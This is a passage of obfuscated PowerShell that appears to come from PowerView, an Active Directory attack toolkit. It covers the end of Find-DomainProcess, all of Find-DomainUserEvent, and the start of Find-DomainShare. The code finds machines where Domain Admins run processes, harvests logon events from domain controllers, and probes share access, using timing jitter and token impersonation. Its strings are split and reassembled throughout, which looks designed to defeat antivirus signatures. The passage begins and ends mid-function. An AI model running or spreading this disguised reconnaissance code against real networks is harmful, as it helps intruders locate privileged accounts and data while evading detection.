        if ($PSBoundParameters[("{0}{1}{3}{2}" -f 'Co','mputerSit','ame','eN')]) { $ComputerSearcherArguments[("{2}{0}{1}" -f 'eNa','me','Sit')] = $SiteName }
        if ($PSBoundParameters[("{2}{0}{1}"-f 'e','rver','S')]) { $ComputerSearcherArguments[("{1}{0}"-f 'er','Serv')] = $Server }
        if ($PSBoundParameters[("{0}{3}{2}{1}"-f 'Se','ope','c','archS')]) { $ComputerSearcherArguments[("{2}{3}{1}{0}"-f 'e','p','Sea','rchSco')] = $SearchScope }
        if ($PSBoundParameters[("{2}{1}{0}"-f 'ize','S','ResultPage')]) { $ComputerSearcherArguments[("{2}{0}{1}"-f'ageSi','ze','ResultP')] = $ResultPageSize }
        if ($PSBoundParameters[("{0}{1}{2}"-f'Serv','erTimeLi','mit')]) { $ComputerSearcherArguments[("{1}{3}{2}{0}"-f'mit','Se','erTimeLi','rv')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{2}{1}"-f 'T','stone','omb')]) { $ComputerSearcherArguments[("{1}{3}{0}{2}"-f 'mbst','T','one','o')] = $Tombstone }
        if ($PSBoundParameters[("{1}{0}{2}" -f'nt','Crede','ial')]) { $ComputerSearcherArguments[("{0}{1}{2}"-f'Crede','nt','ial')] = $Credential }

        $UserSearcherArguments = @{
            ("{1}{2}{0}" -f 'ies','Pr','opert') = ("{0}{3}{2}{1}{4}" -f 'sa','nt','accou','m','name')
        }
        if ($PSBoundParameters[("{0}{1}{2}{3}"-f 'U','serIdent','it','y')]) { $UserSearcherArguments[("{0}{1}"-f'Id','entity')] = $UserIdentity }
        if ($PSBoundParameters[("{0}{1}"-f 'D','omain')]) { $UserSearcherArguments[("{2}{0}{1}"-f'i','n','Doma')] = $Domain }
        if ($PSBoundParameters[("{1}{2}{0}" -f'main','Use','rDo')]) { $UserSearcherArguments[("{0}{1}" -f 'Do','main')] = $UserDomain }
        if ($PSBoundParameters[("{2}{1}{0}{3}"-f 'APF','LD','User','ilter')]) { $UserSearcherArguments[("{0}{1}{2}"-f 'LD','APFilte','r')] = $UserLDAPFilter }
        if ($PSBoundParameters[("{2}{1}{3}{0}"-f 'chBase','e','Us','rSear')]) { $UserSearcherArguments[("{0}{1}{2}" -f 'S','earc','hBase')] = $UserSearchBase }
        if ($PSBoundParameters[("{1}{0}{2}" -f 'erAdmin','Us','Count')]) { $UserSearcherArguments[("{0}{2}{1}" -f'A','nt','dminCou')] = $UserAdminCount }
        if ($PSBoundParameters[("{1}{0}" -f'erver','S')]) { $UserSearcherArguments[("{1}{0}"-f'rver','Se')] = $Server }
        if ($PSBoundParameters[("{2}{0}{1}"-f 'hSco','pe','Searc')]) { $UserSearcherArguments[("{2}{1}{0}"-f'e','p','SearchSco')] = $SearchScope }
        if ($PSBoundParameters[("{3}{4}{0}{2}{1}" -f'geSi','e','z','R','esultPa')]) { $UserSearcherArguments[("{0}{1}{3}{2}" -f'R','e','eSize','sultPag')] = $ResultPageSize }
        if ($PSBoundParameters[("{0}{2}{1}{3}{4}" -f 'Serv','imeLi','erT','mi','t')]) { $UserSearcherArguments[("{0}{1}{2}{3}"-f'ServerTime','L','im','it')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{1}{0}" -f 'stone','omb','T')]) { $UserSearcherArguments[("{0}{2}{1}" -f 'To','e','mbston')] = $Tombstone }
        if ($PSBoundParameters[("{1}{2}{0}"-f'ential','Cre','d')]) { $UserSearcherArguments[("{2}{0}{1}"-f 'ti','al','Creden')] = $Credential }


        
        if ($PSBoundParameters[("{2}{0}{3}{1}" -f'puterN','me','Com','a')]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose ("{3}{6}{5}{4}{0}{9}{8}{12}{11}{7}{1}{2}{10}" -f'nProcess] Querying ','th','e d','[Fin','omai','D','d-',' ','omput','c','omain','s in','er')
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length) "
        if ($TargetComputers.Length -eq 0) {
            throw ("{1}{7}{0}{9}{8}{10}{13}{5}{11}{6}{3}{2}{12}{4}"-f 'ind-DomainPr','[','d to','oun','merate','o host',' f','F','cess','o','] ','s',' enu','N')
        }

        
        if ($PSBoundParameters[("{1}{2}{0}{3}" -f'c','Pr','o','essName')]) {
            $TargetProcessName = @()
            ForEach ($T in $ProcessName) {
                $TargetProcessName += $T.Split(',')
            }
            if ($TargetProcessName -isnot [System.Array]) {
                $TargetProcessName = [String[]] @($TargetProcessName)
            }
        }
        elseif ($PSBoundParameters[("{1}{3}{2}{0}" -f'y','Us','dentit','erI')] -or $PSBoundParameters[("{3}{2}{4}{0}{1}" -f't','er','serLDA','U','PFil')] -or $PSBoundParameters[("{4}{0}{2}{1}{3}" -f'rSearch','s','Ba','e','Use')] -or $PSBoundParameters[("{2}{4}{0}{1}{3}"-f 'erAdmi','nCou','U','nt','s')] -or $PSBoundParameters[("{0}{5}{4}{1}{2}{3}"-f 'Us','De','leg','ation','Allow','er')]) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                ("{0}{1}"-f 'I','dentity') = $UserGroupIdentity
                ("{0}{2}{1}" -f'Re','se','cur') = $True
            }
            if ($PSBoundParameters[("{0}{2}{1}"-f 'U','rDomain','se')]) { $GroupSearcherArguments[("{0}{1}"-f 'Do','main')] = $UserDomain }
            if ($PSBoundParameters[("{3}{1}{0}{4}{2}" -f'rS','se','hBase','U','earc')]) { $GroupSearcherArguments[("{1}{2}{0}" -f'se','Sea','rchBa')] = $UserSearchBase }
            if ($PSBoundParameters[("{0}{2}{1}" -f 'Se','r','rve')]) { $GroupSearcherArguments[("{0}{2}{1}" -f 'Se','ver','r')] = $Server }
            if ($PSBoundParameters[("{2}{0}{1}" -f'hScop','e','Searc')]) { $GroupSearcherArguments[("{1}{0}{2}" -f'p','SearchSco','e')] = $SearchScope }
            if ($PSBoundParameters[("{1}{0}{2}"-f 'ultPageS','Res','ize')]) { $GroupSearcherArguments[("{0}{1}{3}{2}"-f'R','esul','geSize','tPa')] = $ResultPageSize }
            if ($PSBoundParameters[("{4}{3}{0}{1}{2}"-f 'r','TimeLim','it','e','Serv')]) { $GroupSearcherArguments[("{1}{3}{0}{2}" -f 'im','Server','it','TimeL')] = $ServerTimeLimit }
            if ($PSBoundParameters[("{2}{0}{1}" -f'bst','one','Tom')]) { $GroupSearcherArguments[("{2}{1}{0}" -f'e','ton','Tombs')] = $Tombstone }
            if ($PSBoundParameters[("{0}{1}{2}" -f'Cred','entia','l')]) { $GroupSearcherArguments[("{1}{0}{2}"-f'red','C','ential')] = $Credential }
            $GroupSearcherArguments
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        
        $HostEnumBlock = {
            Param($ComputerName, $ProcessName, $TargetUsers, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    
                    
                    if ($Credential) {
                        $Processes = Get-WMIProcess -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    else {
                        $Processes = Get-WMIProcess -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    ForEach ($Process in $Processes) {
                        
                        if ($ProcessName) {
                            if ($ProcessName -Contains $Process.ProcessName) {
                                $Process
                            }
                        }
                        
                        elseif ($TargetUsers -Contains $Process.User) {
                            $Process
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[("{1}{0}" -f'y','Dela')] -or $PSBoundParameters[("{2}{1}{0}" -f's','OnSucces','Stop')]) {

            Write-Verbose "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count) "
            Write-Verbose ('[Find-Domai'+'nPro'+'cess'+'] '+'D'+'elay'+': '+"$Delay, "+'Jitte'+'r:'+' '+"$Jitter")
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetUsers, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose ("{1}{9}{10}{3}{0}{11}{7}{2}{8}{4}{6}{5}" -f'om','[F','] T','-D','rget user ','arly','found, returning e','inProcess','a','in','d','a')
                    return
                }
            }
        }
        else {
            Write-Verbose ('['+'F'+'ind-Domai'+'nPr'+'oce'+'ss] '+'Usi'+'ng'+' '+'t'+'hreadin'+'g '+'w'+'ith '+'t'+'hrea'+'ds: '+"$Threads")

            
            $ScriptParams = @{
                ("{0}{3}{1}{2}" -f'Pr','essNa','me','oc') = $TargetProcessName
                ("{2}{1}{0}{3}" -f'er','s','TargetU','s') = $TargetUsers
                ("{2}{1}{0}" -f'ial','dent','Cre') = $Credential
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainUserEvent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{4}{3}{2}"-f'ldP','PSShou','ess','oc','r'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{6}{5}{3}{7}{4}{2}"-f 'dVarsM','PSUseDeclare','ents','h','ignm','reT','o','anAss'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{3}{4}{0}"-f'ype','rede','PSUsePSC','ntia','lT'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{6}{7}{3}{4}{1}{0}{2}"-f'r','swo','d','ainTe','xtForPas','PSAvoidU','singP','l'}, '')]
    [OutputType({"{3}{0}{4}{2}{1}"-f'w.LogonEv','t','n','PowerVie','e'})]
    [OutputType({"{3}{8}{0}{9}{4}{2}{6}{7}{1}{5}" -f 'w.E','ialLog','re','Powe','icitC','on','d','ent','rVie','xpl'})]
    [CmdletBinding(DefaultParameterSetName = {"{0}{1}"-f'Do','main'})]
    Param(
        [Parameter(ParameterSetName = "Comp`UT`Er`NamE", Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{3}{0}{2}" -f'os','dn','tname','sh'}, {"{0}{1}"-f'Host','Name'}, {"{0}{1}" -f 'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(ParameterSetName = "dO`Main")]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Filter,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'roupName','G'}, {"{1}{0}"-f 'oup','Gr'})]
        [String[]]
        $UserGroupIdentity = ("{0}{2}{1}"-f 'Doma','n Admins','i'),

        [Alias({"{0}{1}{2}"-f'Admin','Cou','nt'})]
        [Switch]
        $UserAdminCount,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{1}{4}" -f'mainC','le','Do','ontrol','r'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}" -f 'se','Ba'}, {"{2}{1}{0}"-f'vel','eLe','On'}, {"{1}{0}"-f'ee','Subtr'})]
        [String]
        $SearchScope = ("{1}{0}" -f'btree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $UserSearcherArguments = @{
            ("{1}{0}{2}" -f'roperti','P','es') = ("{3}{4}{2}{0}{1}"-f'nt','name','cou','sama','c')
        }
        if ($PSBoundParameters[("{2}{0}{1}"-f 'Identi','ty','User')]) { $UserSearcherArguments[("{0}{1}" -f 'Ide','ntity')] = $UserIdentity }
        if ($PSBoundParameters[("{1}{0}{2}"-f 'serDom','U','ain')]) { $UserSearcherArguments[("{0}{2}{1}" -f 'D','ain','om')] = $UserDomain }
        if ($PSBoundParameters[("{2}{0}{3}{1}{4}"-f 's','DAPFi','U','erL','lter')]) { $UserSearcherArguments[("{2}{0}{1}"-f'D','APFilter','L')] = $UserLDAPFilter }
        if ($PSBoundParameters[("{1}{2}{3}{0}{4}"-f 'hBa','Use','rS','earc','se')]) { $UserSearcherArguments[("{0}{3}{1}{2}"-f'Sea','s','e','rchBa')] = $UserSearchBase }
        if ($PSBoundParameters[("{1}{2}{0}{4}{3}" -f'dmi','U','serA','ount','nC')]) { $UserSearcherArguments[("{0}{1}{2}"-f 'Ad','mi','nCount')] = $UserAdminCount }
        if ($PSBoundParameters[("{0}{1}" -f'Serve','r')]) { $UserSearcherArguments[("{0}{1}{2}"-f 'Ser','v','er')] = $Server }
        if ($PSBoundParameters[("{1}{0}{2}" -f'c','SearchS','ope')]) { $UserSearcherArguments[("{1}{3}{2}{0}" -f'pe','Sea','chSco','r')] = $SearchScope }
        if ($PSBoundParameters[("{1}{0}{2}{3}"-f 'su','Re','lt','PageSize')]) { $UserSearcherArguments[("{2}{0}{1}" -f 'z','e','ResultPageSi')] = $ResultPageSize }
        if ($PSBoundParameters[("{1}{3}{4}{0}{2}"-f'L','ServerTi','imit','m','e')]) { $UserSearcherArguments[("{0}{3}{2}{1}" -f 'Serv','t','imeLimi','erT')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{1}{2}{0}"-f 'one','Tom','bst')]) { $UserSearcherArguments[("{1}{0}{2}"-f 'omb','T','stone')] = $Tombstone }
        if ($PSBoundParameters[("{2}{0}{1}" -f'eden','tial','Cr')]) { $UserSearcherArguments[("{2}{1}{0}"-f 'ial','dent','Cre')] = $Credential }

        if ($PSBoundParameters[("{3}{0}{2}{1}" -f'rIde','ity','nt','Use')] -or $PSBoundParameters[("{0}{1}{3}{4}{2}"-f 'UserL','D','lter','A','PFi')] -or $PSBoundParameters[("{0}{2}{1}{3}"-f 'UserSear','a','chB','se')] -or $PSBoundParameters[("{2}{3}{1}{0}{4}"-f 'minCo','d','User','A','unt')]) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters[("{2}{1}{3}{0}{4}" -f 'n','rou','UserG','pIde','tity')] -or (-not $PSBoundParameters[("{0}{1}" -f 'Filte','r')])) {
            
            $GroupSearcherArguments = @{
                ("{0}{1}"-f 'Id','entity') = $UserGroupIdentity
                ("{0}{1}"-f'Recurs','e') = $True
            }
            Write-Verbose ('UserGr'+'oup'+'I'+'den'+'tit'+'y: '+"$UserGroupIdentity")
            if ($PSBoundParameters[("{2}{0}{1}" -f 'er','Domain','Us')]) { $GroupSearcherArguments[("{0}{1}" -f 'Domai','n')] = $UserDomain }
            if ($PSBoundParameters[("{0}{4}{2}{3}{1}" -f'User','e','ear','chBas','S')]) { $GroupSearcherArguments[("{3}{1}{2}{0}"-f'rchBase','e','a','S')] = $UserSearchBase }
            if ($PSBoundParameters[("{0}{1}"-f 'Ser','ver')]) { $GroupSearcherArguments[("{1}{2}{0}" -f'er','Se','rv')] = $Server }
            if ($PSBoundParameters[("{0}{1}{2}" -f'Sea','rchScop','e')]) { $GroupSearcherArguments[("{1}{0}{2}" -f'S','Search','cope')] = $SearchScope }
            if ($PSBoundParameters[("{1}{0}{3}{2}"-f 'esultP','R','eSize','ag')]) { $GroupSearcherArguments[("{1}{0}{2}"-f'Siz','ResultPage','e')] = $ResultPageSize }
            if ($PSBoundParameters[("{1}{3}{0}{2}" -f 'rTime','Serv','Limit','e')]) { $GroupSearcherArguments[("{3}{1}{0}{2}"-f'erTimeLim','rv','it','Se')] = $ServerTimeLimit }
            if ($PSBoundParameters[("{1}{0}{2}"-f 't','Tombs','one')]) { $GroupSearcherArguments[("{2}{0}{1}"-f 'ombst','one','T')] = $Tombstone }
            if ($PSBoundParameters[("{1}{0}{2}"-f'redenti','C','al')]) { $GroupSearcherArguments[("{0}{2}{1}"-f'Cre','ential','d')] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        
        if ($PSBoundParameters[("{0}{3}{2}{1}"-f 'Comp','me','a','uterN')]) {
            $TargetComputers = $ComputerName
        }
        else {
            
            $DCSearcherArguments = @{
                ("{1}{0}"-f'DAP','L') = $True
            }
            if ($PSBoundParameters[("{1}{0}" -f 'omain','D')]) { $DCSearcherArguments[("{1}{0}"-f'ain','Dom')] = $Domain }
            if ($PSBoundParameters[("{0}{1}" -f'Serv','er')]) { $DCSearcherArguments[("{0}{1}" -f 'S','erver')] = $Server }
            if ($PSBoundParameters[("{1}{0}{2}{3}"-f 'de','Cre','nt','ial')]) { $DCSearcherArguments[("{1}{3}{2}{0}" -f 'l','Crede','a','nti')] = $Credential }
            Write-Verbose ('[Find-DomainU'+'se'+'r'+'Even'+'t] '+'Q'+'ueryi'+'ng '+'for'+' '+'dom'+'ain '+'cont'+'rol'+'le'+'rs '+'in'+' '+'domai'+'n'+': '+"$Domain")
            $TargetComputers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($TargetComputers -and ($TargetComputers -isnot [System.Array])) {
            $TargetComputers = @(,$TargetComputers)
        }
        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length) "
        Write-Verbose ('[Fin'+'d'+'-'+'D'+'oma'+'inUs'+'erEvent] '+'Ta'+'r'+'get'+'C'+'omputers '+"$TargetComputers")
        if ($TargetComputers.Length -eq 0) {
            throw ("{8}{11}{7}{12}{6}{5}{4}{3}{14}{9}{2}{1}{0}{13}{10}" -f 'm',' enu','found to','o hos','N','ent] ','Ev','DomainUse','[F','s ','te','ind-','r','era','t')
        }

        
        $HostEnumBlock = {
            Param($ComputerName, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $DomainUserEventArgs = @{
                        ("{2}{0}{1}" -f'terNam','e','Compu') = $TargetComputer
                    }
                    if ($StartTime) { $DomainUserEventArgs[("{1}{0}{2}"-f'tartT','S','ime')] = $StartTime }
                    if ($EndTime) { $DomainUserEventArgs[("{2}{1}{0}"-f'Time','nd','E')] = $EndTime }
                    if ($MaxEvents) { $DomainUserEventArgs[("{1}{0}{2}"-f 'Even','Max','ts')] = $MaxEvents }
                    if ($Credential) { $DomainUserEventArgs[("{1}{0}{2}"-f 'edenti','Cr','al')] = $Credential }
                    if ($Filter -or $TargetUsers) {
                        if ($TargetUsers) {
                            Get-DomainUserEvent @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}
                        }
                        else {
                            $Operator = 'or'
                            $Filter.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq ("{1}{0}" -f 'erator','Op')) -or ($_ -eq ("{2}{0}{1}" -f'r','ation','Ope'))) {
                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq 'and')) {
                                        $Operator = 'and'
                                    }
                                }
                            }
                            $Keys = $Filter.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne ("{1}{0}{2}"-f 'pe','O','rator')) -and ($_ -ne ("{0}{1}"-f 'Operat','ion'))}
                            Get-DomainUserEvent @DomainUserEventArgs | ForEach-Object {
                                if ($Operator -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $Filter[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $Filter[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Get-DomainUserEvent @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        
        if ($PSBoundParameters[("{1}{0}" -f 'lay','De')] -or $PSBoundParameters[("{1}{0}{2}{3}" -f 'topO','S','nSucc','ess')]) {

            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count) "
            Write-Verbose ('[F'+'i'+'nd-D'+'om'+'ai'+'nUser'+'Event] '+'D'+'ela'+'y: '+"$Delay, "+'Jit'+'ter:'+' '+"$Jitter")
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose ("{1}{4}{2}{10}{6}{11}{0}{5}{7}{3}{13}{9}{8}{12}" -f 'rget ','[F','oma',' found, ret','ind-D','use','serEve','r','ea','ning ','inU','nt] Ta','rly','ur')
                    return
                }
            }
        }
        else {
            Write-Verbose ('[Find-'+'Domai'+'nU'+'s'+'erE'+'v'+'ent]'+' '+'Usin'+'g '+'t'+'h'+'reading '+'wi'+'th '+'th'+'reads: '+"$Threads")

            
            $ScriptParams = @{
                ("{2}{1}{0}"-f 'e','tTim','Star') = $StartTime
                ("{0}{1}"-f 'EndTim','e') = $EndTime
                ("{0}{2}{1}" -f'Max','vents','E') = $MaxEvents
                ("{1}{0}{2}"-f 'U','Target','sers') = $TargetUsers
                ("{0}{1}"-f'Fi','lter') = $Filter
                ("{1}{2}{0}"-f'l','Credenti','a') = $Credential
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainShare {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{4}{3}{1}" -f'hould','s','PSS','roces','P'}, '')]
    [OutputType({"{5}{1}{0}{3}{4}{2}" -f'ew','Vi','o','.','ShareInf','Power'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{0}{2}{1}" -f 'D','ostName','NSH'})]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Dom','ain'})]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{0}{1}{2}" -f 'n','gSy','stem','ti','Opera'})]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{2}{1}" -f 'P','ck','a','Service'})]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'me','eNa','Sit'})]
        [String]
        $ComputerSiteName,

        [Alias({"{2}{1}{0}{3}"-f'kAcce','hec','C','ss'})]
        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{0}{3}{2}{1}"-f 'nCon','ler','l','tro','Domai'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}" -f'ase','B'}, {"{0}{1}{2}"-f'On','eLeve','l'}, {"{0}{1}" -f'S','ubtree'})]
        [String]
        $SearchScope = ("{1}{2}{0}" -f'ree','Sub','t'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            ("{1}{2}{0}" -f 'ties','P','roper') = ("{2}{0}{1}{3}"-f'o','s','dnsh','tname')
        }
        if ($PSBoundParameters[("{1}{4}{0}{2}{3}"-f 'ter','C','Doma','in','ompu')]) { $ComputerSearcherArguments[("{0}{1}" -f'Dom','ain')] = $ComputerDomain }
        if ($PSBoundParameters[("{3}{1}{0}{2}" -f 'terLDAPFilte','mpu','r','Co')]) { $ComputerSearcherArguments[("{3}{2}{1}{0}" -f 'er','t','il','LDAPF')] = $ComputerLDAPFilter }
        if ($PSBoundParameters[("{4}{2}{0}{5}{1}{3}"-f 'rSe','h','mpute','Base','Co','arc')]) { $ComputerSearcherArguments[("{3}{1}{0}{2}"-f 'hB','earc','ase','S')] = $ComputerSearchBase }
        if ($PSBoundParameters[("{2}{3}{0}{1}" -f 'r','ained','Uncons','t')]) { $ComputerSearcherArguments[("{2}{3}{1}{0}" -f 'ained','nstr','Unc','o')] = $Unconstrained }
        if ($PSBoundParameters[("{5}{6}{0}{4}{2}{1}{3}"-f'Op','ste','y','m','eratingS','Co','mputer')]) { $ComputerSearcherArguments[("{0}{1}{3}{2}" -f'Op','e','tingSystem','ra')] = $OperatingSystem }
        if ($PSBoundParameters[("{0}{1}{4}{3}{5}{2}" -f 'Compu','terSer','ck','eP','vic','a')]) { $ComputerSearcherArguments[("{2}{0}{1}" -f 'ePac','k','Servic')] = $ServicePack }
        if ($PSBoundParameters[("{1}{4}{5}{2}{3}{0}"-f'e','Compu','rSiteN','am','t','e')]) { $ComputerSearcherArguments[("{1}{2}{0}"-f'Name','S','ite')] = $SiteName }
        if ($PSBoundParameters[("{0}{1}"-f'Serve','r')]) { $ComputerSearcherArguments[("{1}{0}"-f 'r','Serve')] = $Server }
        if ($PSBoundParameters[("{0}{3}{2}{1}"-f'Se','Scope','rch','a')]) { $ComputerSearcherArguments[("{2}{1}{0}"-f 'Scope','rch','Sea')] = $SearchScope }
        if ($PSBoundParameters[("{3}{2}{1}{0}"-f 'ize','PageS','t','Resul')]) { $ComputerSearcherArguments[("{1}{2}{3}{0}"-f 'eSize','Res','ultPa','g')] = $ResultPageSize }
        if ($PSBoundParameters[("{1}{0}{2}{4}{3}" -f'e','S','rverTi','it','meLim')]) { $ComputerSearcherArguments[("{2}{3}{0}{4}{1}" -f'e','t','Serve','rTim','Limi')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{3}{2}{1}{0}" -f'e','on','ombst','T')]) { $ComputerSearcherArguments[("{1}{2}{0}"-f 'mbstone','T','o')] = $Tombstone }
        if ($PSBoundParameters[("{2}{0}{1}" -f'den','tial','Cre')]) { $ComputerSearcherArguments[("{1}{0}{2}"-f'rede','C','ntial')] = $Credential }

        if ($PSBoundParameters[("{3}{0}{1}{2}"-f 'o','mpu','terName','C')]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose ("{1}{0}{10}{12}{4}{8}{11}{9}{6}{5}{7}{2}{3}" -f'nd-Domain','[Fi','e',' domain','rying co',' t','ers in','h','m','t','Sh','pu','are] Que')
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length) "
        if ($TargetComputers.Length -eq 0) {
            throw ("{0}{10}{6}{1}{11}{3}{9}{4}{2}{12}{8}{5}{7}" -f'[F','nSh','foun',' ','s ','numera','-Domai','te','e','host','ind','are] No','d to ')
        }

        
        $HostEnumBlock = {
            Param($ComputerName, $CheckShareAccess, $TokenHandle)

            if ($TokenHandle) {
                
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    
                    $Shares = Get-NetShare -ComputerName $TargetComputer
                    ForEach ($Share in $Shares) {
                        $ShareName = $Share.Name
                        
                        $Path = '\\'+$TargetComputer+'\'+$ShareName

                        if (($ShareName) -and ($ShareName.trim() -ne '')) {
                            
                            if ($CheckShareAccess) {
                                
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose ('Er'+'ror '+'ac'+'ces'+'sing '+'sh'+'are '+'p'+'ath '+"$Path "+': '+"$_")
                                }
